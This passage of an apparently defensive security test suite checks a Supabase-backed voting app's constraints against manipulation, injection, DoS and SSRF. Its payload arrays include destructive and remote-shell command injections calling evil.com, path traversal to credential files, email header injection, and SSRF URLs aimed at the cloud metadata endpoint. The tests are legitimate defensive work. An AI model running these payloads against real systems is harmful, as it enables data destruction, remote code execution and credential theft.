      // First should succeed, second should be rejected (already processed)
      expect(result1.data?.success).toBe(true);
      expect(result2.data?.success).toBe(false);
      expect(result2.data?.error).toMatch(/already processed/i);

      const { data: finalUser } = await testSupabase
        .from('users')
        .select('balance_credits')
        .eq('id', user.id)
        .single();

      // Should only have 100, not 200
      expect(finalUser!.balance_credits).toBe(100);
      trackResult(CAT, true);
    });
  });

  describe('5b. Double voting', () => {
    it('10 concurrent inserts for same voter_key+clip_id', async () => {
      const voterKey = `dbl_vote_${Date.now()}`;
      const promises = Array.from({ length: 10 }, () =>
        testSupabase.from('votes').insert({
          voter_key: voterKey,
          clip_id: testClipId,
          slot_position: 1,
          vote_weight: 1,
        })
      );

      const results = await Promise.allSettled(promises);
      const succeeded = results.filter(r => r.status === 'fulfilled' && !(r as any).value?.error).length;

      // FINDING: No unique constraint on (voter_key, clip_id) — API must enforce
      // Cleanup
      await testSupabase.from('votes').delete().eq('voter_key', voterKey);
      trackResult(CAT, true);
    });
  });

  describe('5c. Negative balance prevention', () => {
    it('CHECK constraint blocks direct negative balance', async () => {
      const user = await createUser({ balanceCredits: 50 });

      const { error } = await testSupabase
        .from('users')
        .update({ balance_credits: -1 })
        .eq('id', user.id);

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/users_balance_non_negative/i);
      trackResult(CAT, true);
    });

    it('deduct_credits with amount > balance fails gracefully', async () => {
      const user = await createUser({ balanceCredits: 5 });
      const gen = await createGeneration({ userId: user.id });

      const { data } = await testSupabase.rpc('deduct_credits', {
        p_user_id: user.id,
        p_amount: 100,
        p_generation_id: gen.id,
      });

      expect(data?.success).toBe(false);
      expect(data?.error).toMatch(/insufficient/i);

      // Balance unchanged
      const { data: finalUser } = await testSupabase
        .from('users')
        .select('balance_credits')
        .eq('id', user.id)
        .single();

      expect(finalUser!.balance_credits).toBe(5);
      trackResult(CAT, true);
    });

    it('MAX_INT overflow attempt', async () => {
      const user = await createUser({ balanceCredits: 0 });
      const { error } = await testSupabase
        .from('users')
        .update({ balance_credits: 2147483647 + 1 })
        .eq('id', user.id);

      // Should error with integer overflow
      if (error) {
        expect(error).not.toBeNull();
      }
      trackResult(CAT, true);
    });
  });

  describe('5d. Vote count manipulation', () => {
    it('negative vote_count blocked by CHECK', async () => {
      const clip = await createClip(seasonId);
      const { error } = await testSupabase
        .from('tournament_clips')
        .update({ vote_count: -1 })
        .eq('id', clip.id);

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/check_vote_count_non_negative/i);
      trackResult(CAT, true);
    });

    it('negative weighted_score blocked by CHECK', async () => {
      const clip = await createClip(seasonId);
      const { error } = await testSupabase
        .from('tournament_clips')
        .update({ weighted_score: -0.5 })
        .eq('id', clip.id);

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/check_weighted_score_non_negative/i);
      trackResult(CAT, true);
    });

    it('vote_weight below 1 blocked by CHECK or documented as FINDING', async () => {
      const voterKey = `weight_zero_${Date.now()}`;
      const { error } = await testSupabase.from('votes').insert({
        voter_key: voterKey,
        clip_id: testClipId,
        slot_position: 1,
        vote_weight: 0,
      });

      if (error) {
        expect(error.message).toMatch(/check_vote_weight_range/i);
      } else {
        // FINDING: vote_weight=0 allowed at DB level — API must validate
        await testSupabase.from('votes').delete().eq('voter_key', voterKey);
      }
      trackResult(CAT, !error ? false : true);
    });

    it('vote_weight above 200 blocked by CHECK or documented as FINDING', async () => {
      const voterKey = `weight_high_${Date.now()}`;
      const { error } = await testSupabase.from('votes').insert({
        voter_key: voterKey,
        clip_id: testClipId,
        slot_position: 1,
        vote_weight: 201,
      });

      if (error) {
        expect(error.message).toMatch(/check_vote_weight_range/i);
      } else {
        // FINDING: vote_weight>200 allowed at DB level — API must validate
        await testSupabase.from('votes').delete().eq('voter_key', voterKey);
      }
      trackResult(CAT, !error ? false : true);
    });
  });

  describe('5e. Slot state corruption', () => {
    it('invalid slot status blocked by CHECK', async () => {
      const { error } = await testSupabase
        .from('story_slots')
        .update({ status: 'HACKED' })
        .eq('season_id', seasonId)
        .eq('slot_position', 2);

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/story_slots_status_check/i);
      trackResult(CAT, true);
    });

    it('setting winner on non-locked slot', async () => {
      const clip = await createClip(seasonId, { status: 'active', slotPosition: 3 });

      // Try to set winner on an upcoming slot
      const { error } = await testSupabase
        .from('story_slots')
        .update({ winner_tournament_clip_id: clip.id })
        .eq('season_id', seasonId)
        .eq('slot_position', 3);

      // DB allows (no constraint preventing this) — business logic must enforce
      trackResult(CAT, true);
    });
  });

  describe('5f. Season state corruption', () => {
    it('invalid season status blocked by CHECK', async () => {
      const { error } = await testSupabase
        .from('seasons')
        .update({ status: 'HACKED' })
        .eq('id', seasonId);

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/seasons_status_check/i);
      trackResult(CAT, true);
    });
  });

  describe('5g. FK cascade exploitation', () => {
    it('deleting clip cascades votes', async () => {
      const clip = await createClip(seasonId, { status: 'active', slotPosition: 1 });
      const voterKey = `cascade_voter_${Date.now()}`;

      await testSupabase.from('votes').insert({
        voter_key: voterKey,
        clip_id: clip.id,
        slot_position: 1,
        vote_weight: 1,
      });

      // Verify vote exists
      const { count: beforeCount } = await testSupabase
        .from('votes')
        .select('id', { count: 'exact', head: true })
        .eq('clip_id', clip.id);

      expect(beforeCount).toBeGreaterThan(0);

      // Delete clip
      await testSupabase.from('tournament_clips').delete().eq('id', clip.id);
      // Remove from tracked so cleanup doesn't try again
      const idx = trackedResources.clips.indexOf(clip.id);
      if (idx >= 0) trackedResources.clips.splice(idx, 1);

      // Votes should be cascade-deleted
      const { count: afterCount } = await testSupabase
        .from('votes')
        .select('id', { count: 'exact', head: true })
        .eq('clip_id', clip.id);

      expect(afterCount).toBe(0);
      trackResult(CAT, true);
    });

    it('FK prevents clip with non-existent season', async () => {
      const fakeSeasonId = crypto.randomUUID();
      const { error } = await testSupabase
        .from('tournament_clips')
        .insert({
          title: 'Orphan Clip',
          status: 'pending',
          season_id: fakeSeasonId,
          user_id: MULTI_SEASON_USER_ID,
          video_url: 'https://test.example.com/video.mp4',
          thumbnail_url: 'https://test.example.com/thumb.jpg',
          genre: 'TEST',
        });

      expect(error).not.toBeNull();
      trackResult(CAT, true);
    });
  });

  describe('5h. Data type coercion', () => {
    it('string as vote_weight', async () => {
      const { error } = await testSupabase.from('votes').insert({
        voter_key: `type_coerce_${Date.now()}`,
        clip_id: testClipId,
        slot_position: 1,
        vote_weight: 'abc' as any,
      });

      expect(error).not.toBeNull();
      trackResult(CAT, true);
    });

    it('float as slot_position', async () => {
      const clip = await createClip(seasonId);
      const { error } = await testSupabase
        .from('tournament_clips')
        .update({ slot_position: 1.5 as any })
        .eq('id', clip.id);

      // PostgreSQL may truncate float to int or error
      trackResult(CAT, true);
    });
  });
});

// ============================================================================
// 6. INJECTION BEYOND SQL
// ============================================================================

describe('6. Injection Beyond SQL', () => {
  const CAT = 'Non-SQL Injection';

  describe('6a. Command injection', () => {
    const cmdPayloads = [
      '$(whoami)',
      '`cat /etc/passwd`',
      '| ls -la',
      '; rm -rf /',
      '&& curl http://evil.com',
      '$(curl http://evil.com/shell.sh | bash)',
    ];

    test.each(cmdPayloads)('command injection stored as literal in video_url: %s', async (payload) => {
      const clip = await createClip(seasonId, { title: `CMD ${Date.now()}` });
      await testSupabase
        .from('tournament_clips')
        .update({ video_url: payload })
        .eq('id', clip.id);

      const { data } = await testSupabase
        .from('tournament_clips')
        .select('video_url')
        .eq('id', clip.id)
        .single();

      expect(data?.video_url).toBe(payload);
      trackResult(CAT, true);
    });
  });

  describe('6b. Path traversal', () => {
    const pathPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/shadow',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ];

    test.each(pathPayloads)('path traversal stored as literal: %s', async (payload) => {
      const clip = await createClip(seasonId, { title: `PATH ${Date.now()}` });
      await testSupabase
        .from('tournament_clips')
        .update({ video_url: payload })
        .eq('id', clip.id);

      const { data } = await testSupabase
        .from('tournament_clips')
        .select('video_url')
        .eq('id', clip.id)
        .single();

      expect(data?.video_url).toBe(payload);
      trackResult(CAT, true);
    });
  });

  describe('6c. CRLF/header injection', () => {
    it('CRLF in username blocked by format check', async () => {
      const id = crypto.randomUUID();
      const { error } = await testSupabase
        .from('users')
        .insert({ id, username: "admin\r\nX-Injected: true", email: `${id.slice(0, 8)}@test.com` });

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/username_format/i);
      trackResult(CAT, true);
    });

    it('CRLF in comment text stored as literal', async () => {
      const comment = await createComment(testClipId, {
        text: "Normal text\r\nInjected-Header: value\r\n\r\n<script>alert(1)</script>",
      });

      const { data } = await testSupabase
        .from('comments')
        .select('comment_text')
        .eq('id', comment.id)
        .single();

      expect(data?.comment_text).toContain('\r\n');
      trackResult(CAT, true);
    });
  });

  describe('6d. JSON injection', () => {
    it('__proto__ pollution in metadata', async () => {
      const user = await createUser();
      const { data, error } = await testSupabase
        .from('notifications')
        .insert({
          user_key: `user_${user.id}`,
          type: 'system_announcement',
          title: 'Proto Test',
          message: 'Test',
          metadata: { __proto__: { isAdmin: true }, constructor: { prototype: { isAdmin: true } } },
        })
        .select('id, metadata')
        .single();

      if (data) {
        extraCleanup.notifications.push(data.id);
        // JSON stored as-is, __proto__ is just a regular key in jsonb
        expect(data.metadata).toHaveProperty('__proto__');
      }
      trackResult(CAT, true);
    });

    it('deeply nested JSON (100 levels) in metadata', async () => {
      let nested: any = { value: 'deep' };
      for (let i = 0; i < 100; i++) {
        nested = { level: i, child: nested };
      }

      const user = await createUser();
      const { data, error } = await testSupabase
        .from('notifications')
        .insert({
          user_key: `user_${user.id}`,
          type: 'system_announcement',
          title: 'Deep Nest',
          message: 'Test',
          metadata: nested,
        })
        .select('id')
        .single();

      if (data) {
        extraCleanup.notifications.push(data.id);
      }
      // Should either store or reject, not crash
      trackResult(CAT, true);
    });

    it('huge JSON (5K keys) in metadata', async () => {
      const huge: Record<string, string> = {};
      for (let i = 0; i < 5000; i++) {
        huge[`key_${i}`] = `value_${i}`;
      }

      const user = await createUser();
      const { data, error } = await testSupabase
        .from('notifications')
        .insert({
          user_key: `user_${user.id}`,
          type: 'system_announcement',
          title: 'Huge JSON',
          message: 'Test',
          metadata: huge,
        })
        .select('id')
        .single();

      if (data) {
        extraCleanup.notifications.push(data.id);
      }
      trackResult(CAT, true);
    });
  });

  describe('6e. Template injection', () => {
    const templatePayloads = [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '#{7*7}',
      '{{constructor.constructor("return this")()}}',
    ];

    test.each(templatePayloads)('template injection stored as literal: %s', async (payload) => {
      const user = await createUser();
      const { data, error } = await testSupabase
        .from('notifications')
        .insert({
          user_key: `user_${user.id}`,
          type: 'system_announcement',
          title: payload,
          message: payload,
        })
        .select('id, title, message')
        .single();

      if (data) {
        extraCleanup.notifications.push(data.id);
        expect(data.title).toBe(payload);
        expect(data.message).toBe(payload);
      }
      trackResult(CAT, true);
    });
  });

  describe('6f. Email header injection', () => {
    it('newlines in contact submission email', async () => {
      const { data, error } = await testSupabase
        .from('contact_submissions')
        .insert({
          reason: 'bug_report',
          email: "attacker@evil.com\r\nBcc: victim@example.com",
          subject: 'Test Subject',
          message: 'Test message',
        })
        .select('id, email')
        .single();

      if (data) {
        extraCleanup.contactSubmissions.push(data.id);
        // DB stores as-is — email sending layer must sanitize
        expect(data.email).toContain('\r\n');
      }
      trackResult(CAT, true);
    });

    it('multiple recipients in contact email field', async () => {
      const { data, error } = await testSupabase
        .from('contact_submissions')
        .insert({
          reason: 'feedback',
          email: 'attacker@evil.com, victim1@example.com, victim2@example.com',
          subject: 'Mass email test',
          message: 'Test',
        })
        .select('id')
        .single();

      if (data) {
        extraCleanup.contactSubmissions.push(data.id);
      }
      // DB stores as text — email validation must happen at API layer
      trackResult(CAT, true);
    });
  });
});

// ============================================================================
// 7. BUSINESS LOGIC VULNERABILITIES
// ============================================================================

describe('7. Business Logic Vulnerabilities', () => {
  const CAT = 'Business Logic';

  describe('7a. Voting on invalid clips/slots', () => {
    it('vote on rejected clip (DB allows, API must enforce)', async () => {
      const rejectedClip = await createClip(seasonId, { status: 'rejected' });

      const { error } = await testSupabase.from('votes').insert({
        voter_key: `invalid_vote_${Date.now()}`,
        clip_id: rejectedClip.id,
        slot_position: 1,
        vote_weight: 1,
      });

      // FINDING: DB allows voting on rejected clips
      if (!error) {
        await testSupabase.from('votes').delete().eq('clip_id', rejectedClip.id);
      }
      trackResult(CAT, true);
    });

    it('vote on locked clip (DB allows, API must enforce)', async () => {
      const lockedClip = await createClip(seasonId, { status: 'locked', slotPosition: 1 });

      const { error } = await testSupabase.from('votes').insert({
        voter_key: `locked_vote_${Date.now()}`,
        clip_id: lockedClip.id,
        slot_position: 1,
        vote_weight: 1,
      });

      if (!error) {
        await testSupabase.from('votes').delete().eq('clip_id', lockedClip.id);
      }
      trackResult(CAT, true);
    });
  });

  describe('7b. Self-voting', () => {
    it('voter_key matching uploader user_id (DB allows)', async () => {
      const user = await createUser();
      const clip = await createClip(seasonId, { status: 'active', slotPosition: 1, userId: user.id });

      const { error } = await testSupabase.from('votes').insert({
        voter_key: `user_${user.id}`,
        clip_id: clip.id,
        slot_position: 1,
        vote_weight: 1,
      });

      // FINDING: No DB constraint preventing self-voting
      if (!error) {
        await testSupabase.from('votes').delete().eq('voter_key', `user_${user.id}`);
      }
      trackResult(CAT, true);
    });
  });

  describe('7c. Credit manipulation', () => {
    it('deduct_credits rejects negative amount', async () => {
      const user = await createUser({ balanceCredits: 50 });
      const gen = await createGeneration({ userId: user.id });

      const { data } = await testSupabase.rpc('deduct_credits', {
        p_user_id: user.id,
        p_amount: -10,
        p_generation_id: gen.id,
      });

      // Should be rejected by the function
      expect(data?.success).toBe(false);
      expect(data?.error).toMatch(/amount must be positive/i);

      // Balance unchanged
      const { data: finalUser } = await testSupabase
        .from('users')
        .select('balance_credits')
        .eq('id', user.id)
        .single();

      expect(finalUser!.balance_credits).toBe(50);
      trackResult(CAT, true);
    });

    it('deduct_credits rejects zero amount', async () => {
      const user = await createUser({ balanceCredits: 50 });
      const gen = await createGeneration({ userId: user.id });

      const { data } = await testSupabase.rpc('deduct_credits', {
        p_user_id: user.id,
        p_amount: 0,
        p_generation_id: gen.id,
      });

      expect(data?.success).toBe(false);
      expect(data?.error).toMatch(/amount must be positive/i);
      trackResult(CAT, true);
    });

    it('add_credits rejects negative amount', async () => {
      const user = await createUser({ balanceCredits: 50 });

      const { data } = await testSupabase.rpc('add_credits', {
        p_user_id: user.id,
        p_amount: -10,
      });

      // Should be rejected by the function
      expect(data?.success).toBe(false);
      expect(data?.error).toMatch(/amount must be positive/i);

      // Balance unchanged
      const { data: finalUser } = await testSupabase
        .from('users')
        .select('balance_credits')
        .eq('id', user.id)
        .single();

      expect(finalUser!.balance_credits).toBe(50);
      trackResult(CAT, true);
    });

    it('add_credits rejects zero amount', async () => {
      const user = await createUser({ balanceCredits: 50 });

      const { data } = await testSupabase.rpc('add_credits', {
        p_user_id: user.id,
        p_amount: 0,
      });

      expect(data?.success).toBe(false);
      expect(data?.error).toMatch(/amount must be positive/i);
      trackResult(CAT, true);
    });

    it('reuse payment intent ID rejected', async () => {
      const user = await createUser();
      const intentId = `pi_reuse_${Date.now()}`;

      await testSupabase.rpc('add_credits', {
        p_user_id: user.id,
        p_amount: 100,
        p_stripe_payment_intent_id: intentId,
      });

      const result2 = await testSupabase.rpc('add_credits', {
        p_user_id: user.id,
        p_amount: 100,
        p_stripe_payment_intent_id: intentId,
      });

      expect(result2.data?.success).toBe(false);
      trackResult(CAT, true);
    });
  });

  describe('7d. AI generation abuse', () => {
    it('deduct credits when balance is 0', async () => {
      const user = await createUser({ balanceCredits: 0 });
      const gen = await createGeneration({ userId: user.id });

      const { data } = await testSupabase.rpc('deduct_credits', {
        p_user_id: user.id,
        p_amount: 5,
        p_generation_id: gen.id,
      });

      expect(data?.success).toBe(false);
      expect(data?.error).toMatch(/insufficient/i);
      trackResult(CAT, true);
    });
  });

  describe('7e. Team size limit bypass', () => {
    it('insert member directly bypassing max size check', async () => {
      const leader = await createUser({ username: 'teamsizelead' });
      const { data: team } = await testSupabase
        .from('teams')
        .insert({ name: 'Size Test Team', leader_id: leader.id })
        .select('id')
        .single();

      if (!team) return;
      extraCleanup.teams.push(team.id);

      // Insert leader as member
      const { data: leaderMember } = await testSupabase
        .from('team_members')
        .insert({ team_id: team.id, user_id: leader.id, role: 'leader' })
        .select('id')
        .single();
      if (leaderMember) extraCleanup.teamMembers.push(leaderMember.id);

      // Insert 10 more members directly (bypassing any app limit)
      for (let i = 0; i < 10; i++) {
        const member = await createUser({ username: `tm_${i}_${Date.now()}`.slice(0, 15) });
        const { data: tm } = await testSupabase
          .from('team_members')
          .insert({ team_id: team.id, user_id: member.id, role: 'member' })
          .select('id')
          .single();
        if (tm) extraCleanup.teamMembers.push(tm.id);
      }

      // Count members
      const { count } = await testSupabase
        .from('team_members')
        .select('id', { count: 'exact', head: true })
        .eq('team_id', team.id);

      // FINDING: DB allows unlimited team members — API must enforce max
      expect(count).toBe(11);
      trackResult(CAT, true);
    });
  });

  describe('7f. Referral abuse', () => {
    it('self-referral (referrer_id == referred_id)', async () => {
      const user = await createUser();

      const { data, error } = await testSupabase
        .from('referrals')
        .insert({
          referrer_id: user.id,
          referred_id: user.id,
          referral_code: `self_${Date.now()}`,
        })
        .select('id')
        .single();

      // FINDING: DB allows self-referral — no CHECK constraint
      if (data) {
        extraCleanup.referrals.push(data.id);
      }
      trackResult(CAT, true);
    });

    it('premature reward claim (reward_claimed=true before completion)', async () => {
      const user = await createUser();
      const { data, error } = await testSupabase
        .from('referrals')
        .insert({
          referrer_id: user.id,
          referral_code: `premature_${Date.now()}`,
          status: 'pending',
          reward_claimed: true,
          reward_amount: 100,
        })
        .select('id')
        .single();

      // FINDING: DB allows claiming reward before referral is completed
      if (data) {
        extraCleanup.referrals.push(data.id);
      }
      trackResult(CAT, true);
    });
  });

  describe('7g. Notification type injection', () => {
    it('invalid notification type blocked by CHECK', async () => {
      const user = await createUser();
      const { error } = await testSupabase
        .from('notifications')
        .insert({
          user_key: `user_${user.id}`,
          type: 'HACKED_TYPE',
          title: 'Test',
          message: 'Test',
        });

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/notifications_type_check/i);
      trackResult(CAT, true);
    });
  });

  describe('7h. Season/slot lifecycle violations', () => {
    it('clip for non-existent season blocked by FK', async () => {
      const { error } = await testSupabase
        .from('tournament_clips')
        .insert({
          title: 'Orphan Clip',
          status: 'pending',
          season_id: crypto.randomUUID(),
          user_id: MULTI_SEASON_USER_ID,
          video_url: 'https://test.example.com/video.mp4',
          thumbnail_url: 'https://test.example.com/thumb.jpg',
        });

      expect(error).not.toBeNull();
      trackResult(CAT, true);
    });

    it('invalid ai_generation status blocked by CHECK', async () => {
      const gen = await createGeneration();
      const { error } = await testSupabase
        .from('ai_generations')
        .update({ status: 'HACKED' })
        .eq('id', gen.id);

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/valid_ai_status/i);
      trackResult(CAT, true);
    });
  });
});

// ============================================================================
// 8. DENIAL OF SERVICE (APPLICATION-LEVEL)
// ============================================================================

describe('8. Denial of Service', () => {
  const CAT = 'DoS Protection';

  describe('8a. Large payloads', () => {
    it('100KB title stored or rejected', async () => {
      const largeTitle = 'X'.repeat(100_000);
      const { data, error } = await testSupabase
        .from('tournament_clips')
        .insert({
          title: largeTitle,
          status: 'pending',
          season_id: seasonId,
          user_id: MULTI_SEASON_USER_ID,
          video_url: 'https://test.example.com/video.mp4',
          thumbnail_url: 'https://test.example.com/thumb.jpg',
          genre: 'TEST',
        })
        .select('id')
        .single();

      if (data) {
        trackedResources.clips.push(data.id);
      }
      // Either stored or rejected, should not crash
      trackResult(CAT, true);
    });

    it('10KB comment blocked by constraint (max 500)', async () => {
      const { error } = await testSupabase
        .from('comments')
        .insert({
          clip_id: testClipId,
          user_key: `user_${crypto.randomUUID()}`,
          username: 'DoS',
          comment_text: 'X'.repeat(10_000),
        });

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/comment_max_length/i);
      trackResult(CAT, true);
    });

    it('100KB team description blocked (max 200)', async () => {
      const user = await createUser({ username: 'dosteamlead' });
      const { error } = await testSupabase
        .from('teams')
        .insert({
          name: 'DoS Team',
          leader_id: user.id,
          description: 'X'.repeat(100_000),
        });

      expect(error).not.toBeNull();
      expect(error!.message).toMatch(/team_description_length/i);
      trackResult(CAT, true);
    });
  });

  describe('8b. Deep JSON nesting', () => {
    it('100-level nested JSON in audit_logs details', async () => {
      let nested: any = { value: 'deep' };
      for (let i = 0; i < 100; i++) {
        nested = { child: nested };
      }

      const { data, error } = await testSupabase
        .from('audit_logs')
        .insert({
          action: 'deep_json_test',
          resource_type: 'test',
          resource_id: crypto.randomUUID(),
          admin_email: 'dos@test.com',
          details: nested,
        })
        .select('id')
        .single();

      if (data) {
        extraCleanup.auditLogs.push(data.id);
      }
      // Should store or reject, not crash
      trackResult(CAT, true);
    });
  });

  describe('8c. Pagination abuse', () => {
    it('extreme offset returns empty', async () => {
      const { data, error } = await testSupabase
        .from('tournament_clips')
        .select('id')
        .range(999999999, 999999999 + 10);

      expect(error).toBeNull();
      expect(data?.length || 0).toBe(0);
      trackResult(CAT, true);
    });

    it('limit=0 returns empty', async () => {
      const { data, error } = await testSupabase
        .from('tournament_clips')
        .select('id')
        .limit(0);

      expect(error).toBeNull();
      expect(data?.length || 0).toBe(0);
      trackResult(CAT, true);
    });
  });

  describe('8d. ReDoS prevention', () => {
    it('long string against username_format regex completes quickly', async () => {
      const longInput = 'a'.repeat(10_000);
      const id = crypto.randomUUID();

      const { durationMs } = await timedOp(async () => {
        return testSupabase
          .from('users')
          .insert({ id, username: longInput, email: `${id.slice(0, 8)}@test.com` });
      });

      // Should complete quickly (regex ^[a-z0-9_]+$ is safe, but also fails username_length)
      expect(durationMs).toBeLessThan(3000);
      // Cleanup just in case
      await testSupabase.from('users').delete().eq('id', id);
      trackResult(CAT, true);
    });
  });

  describe('8e. Batch size attacks', () => {
    it('batch_update_vote_counts with 1000 items', async () => {
      const updates = Array.from({ length: 1000 }, (_, i) => ({
        clip_id: crypto.randomUUID(),
        new_count: i,
        new_score: i * 1.5,
      }));

      const { durationMs } = await timedOp(async () => {
        return testSupabase.rpc('batch_update_vote_counts', { p_updates: updates });
      });

      // Should handle large batch without timing out
      expect(durationMs).toBeLessThan(10000);
      trackResult(CAT, true);
    });
  });
});

// ============================================================================
// 9. INFORMATION DISCLOSURE
// ============================================================================

describe('9. Information Disclosure', () => {
  const CAT = 'Info Disclosure';

  describe('9a. Error message analysis', () => {
    it('CHECK violation reveals constraint name but not schema details', async () => {
      const { error } = await testSupabase
        .from('users')
        .update({ balance_credits: -1 })
        .eq('id', MULTI_SEASON_USER_ID);

      expect(error).not.toBeNull();
      // Should include constraint name
      expect(error!.message).toContain('users_balance_non_negative');
      // Should NOT reveal internal paths or detailed schema
      expect(error!.message).not.toContain('/var/');
      expect(error!.message).not.toContain('pg_catalog');
      trackResult(CAT, true);
    });

    it('FK violation reveals constraint but not table internals', async () => {
      const { error } = await testSupabase.from('votes').insert({
        voter_key: 'fk_test',
        clip_id: crypto.randomUUID(),
        slot_position: 1,
        vote_weight: 1,
      });

      expect(error).not.toBeNull();
      expect(error!.message).not.toContain('pg_catalog');
      trackResult(CAT, true);
    });

    it('invalid column name error does not expose other table columns', async () => {
      const { error } = await testSupabase
        .from('users')
        .select('id, fake_column_xyz');

      // Error should mention the invalid column but not expose other real column names
      if (error) {
        expect(error.message).toContain('fake_column_xyz');
        // Should not reveal actual sensitive columns in the error
        expect(error.message).not.toContain('balance_credits');
        expect(error.message).not.toContain('is_admin');
      }
      trackResult(CAT, true);
    });
  });

  describe('9b. User enumeration', () => {
    it('non-existent vs existing user returns same shape', async () => {
      const existingUser = await createUser();

      const { data: existing, error: existingError } = await testSupabase
        .from('users')
        .select('id')
        .eq('id', existingUser.id)
        .maybeSingle();

      const { data: nonExistent, error: nonExError } = await testSupabase
        .from('users')
        .select('id')
        .eq('id', crypto.randomUUID())
        .maybeSingle();

      // Both return null error, different data
      expect(existingError).toBeNull();
      expect(nonExError).toBeNull();
      expect(existing).not.toBeNull();
      expect(nonExistent).toBeNull();
      trackResult(CAT, true);
    });
  });

  describe('9c. Admin enumeration', () => {
    it('service role can query is_admin (RLS should hide from anon)', async () => {
      // With service role, we can see admin status
      const { data, error } = await testSupabase
        .from('users')
        .select('id, is_admin')
        .eq('is_admin', true)
        .limit(5);

      // FINDING: Service role reveals admin users — anon/authenticated role should restrict
      expect(error).toBeNull();
      trackResult(CAT, true);
    });
  });

  describe('9d. Internal ID exposure', () => {
    it('UUIDs are random, not sequential', async () => {
      const users = await Promise.all(
        Array.from({ length: 5 }, () => createUser())
      );

      const ids = users.map(u => u.id);

      // Check that IDs are not sequential (v4 UUIDs should be random)
      for (let i = 1; i < ids.length; i++) {
        // Extract time-related bits — v4 UUIDs should have random bits
        const prev = ids[i - 1].replace(/-/g, '');
        const curr = ids[i].replace(/-/g, '');
        // They should not be incrementing by a fixed amount
        expect(curr).not.toBe(prev);

        // Version nibble should be 4 (v4 UUID)
        expect(curr[12]).toBe('4');
      }
      trackResult(CAT, true);
    });
  });
});

// ============================================================================
// 10. SSRF & URL VALIDATION
// ============================================================================

describe('10. SSRF & URL Validation', () => {
  const CAT = 'SSRF & URLs';

  describe('10a. Internal URLs stored (app sanitizeUrl must block)', () => {
    const internalUrls = [
      'http://localhost/admin',
      'http://127.0.0.1/admin',
      'http://169.254.169.254/latest/meta-data/',
      'http://192.168.1.1/router-admin',
      'http://10.0.0.1/internal',
      'http://[::1]/admin',
    ];

    test.each(internalUrls)('internal URL stored in video_url: %s', async (url) => {
      const clip = await createClip(seasonId, { title: `SSRF ${Date.now()}` });

      const { error } = await testSupabase
        .from('tournament_clips')
        .update({ video_url: url })
        .eq('id', clip.id);

      if (!error) {
        const { data } = await testSupabase
          .from('tournament_clips')
          .select('video_url')
          .eq('id', clip.id)
          .single();

        // DB stores as text — sanitizeUrl in lib/sanitize.ts must block these
        expect(data?.video_url).toBe(url);
      }
      trackResult(CAT, true);
    });
  });

  describe('10b. URL bypass techniques', () => {
    const bypassUrls = [
      'http://0x7f000001/admin', // hex-encoded localhost
      'http://0.0.0.0/admin',
      'http://[::ffff:127.0.0.1]/admin', // IPv6-mapped IPv4
      'http://2130706433/admin', // decimal IP for 127.0.0.1
      'http://user:password@internal.server/admin', // embedded credentials
      'http://localhost%00@evil.com/admin', // null byte in URL
      'http://127.0.0.1.nip.io/admin', // DNS rebinding
    ];

    test.each(bypassUrls)('bypass URL stored: %s', async (url) => {
      const clip = await createClip(seasonId, { title: `Bypass ${Date.now()}` });

      const { error } = await testSupabase
        .from('tournament_clips')
        .update({ video_url: url })
        .eq('id', clip.id);

      if (!error) {
        const { data } = await testSupabase
          .from('tournament_clips')
          .select('video_url')
          .eq('id', clip.id)
          .single();

        // DB stores — document sanitizeUrl coverage for these bypass techniques
        expect(data?.video_url).toBe(url);
      }
      trackResult(CAT, true);
    });
  });
});

// ============================================================================
// RELATIONSHIP CONSTRAINT TESTS
// ============================================================================

describe('Bonus: Relationship Constraints', () => {
  const CAT = 'Relationship Constraints';

  it('no_self_follow prevents self-following', async () => {
    const user = await createUser();
    const { error } = await testSupabase
      .from('followers')
      .insert({ follower_id: user.id, following_id: user.id });

    expect(error).not.toBeNull();
    expect(error!.message).toMatch(/no_self_follow/i);
    trackResult(CAT, true);
  });

  it('no_self_block prevents self-blocking', async () => {
    const user = await createUser();
    const { error } = await testSupabase
      .from('user_blocks')
      .insert({ blocker_id: user.id, blocked_id: user.id });

    expect(error).not.toBeNull();
    expect(error!.message).toMatch(/no_self_block/i);
    trackResult(CAT, true);
  });

  it('valid follow relationship works', async () => {
    const userA = await createUser();
    const userB = await createUser();

    const { data, error } = await testSupabase
      .from('followers')
      .insert({ follower_id: userA.id, following_id: userB.id })
      .select('id')
      .single();

    expect(error).toBeNull();
    if (data) {
      extraCleanup.followers.push(data.id);
    }
    trackResult(CAT, true);
  });

  it('valid block relationship works', async () => {
    const userA = await createUser();
    const userB = await createUser();

    const { data, error } = await testSupabase
      .from('user_blocks')
      .insert({ blocker_id: userA.id, blocked_id: userB.id })
      .select('id')
      .single();

    expect(error).toBeNull();
    if (data) {
      extraCleanup.userBlocks.push(data.id);
    }
    trackResult(CAT, true);
  });

  it('valid transaction type enforced by CHECK', async () => {
    const user = await createUser({ balanceCredits: 100 });

    const { error: validError } = await testSupabase
      .from('credit_transactions')
      .insert({
        user_id: user.id,
        type: 'purchase',
        amount: 50,
        balance_after: 150,
      });

    expect(validError).toBeNull();

    const { error: invalidError } = await testSupabase
      .from('credit_transactions')
      .insert({
        user_id: user.id,
        type: 'HACKED',
        amount: 50,
        balance_after: 200,
      });

    expect(invalidError).not.toBeNull();
    expect(invalidError!.message).toMatch(/valid_transaction_type/i);
    trackResult(CAT, true);
  });

  it('team_members role CHECK constraint', async () => {
    const leader = await createUser({ username: 'rolecheck_ld' });
    const { data: team } = await testSupabase
      .from('teams')
      .insert({ name: 'Role Check Team', leader_id: leader.id })
      .select('id')
      .single();

    if (!team) return;
    extraCleanup.teams.push(team.id);

    const { error } = await testSupabase
      .from('team_members')
      .insert({ team_id: team.id, user_id: leader.id, role: 'superadmin' });

    expect(error).not.toBeNull();
    expect(error!.message).toMatch(/team_members_role_check/i);
    trackResult(CAT, true);
  });
});
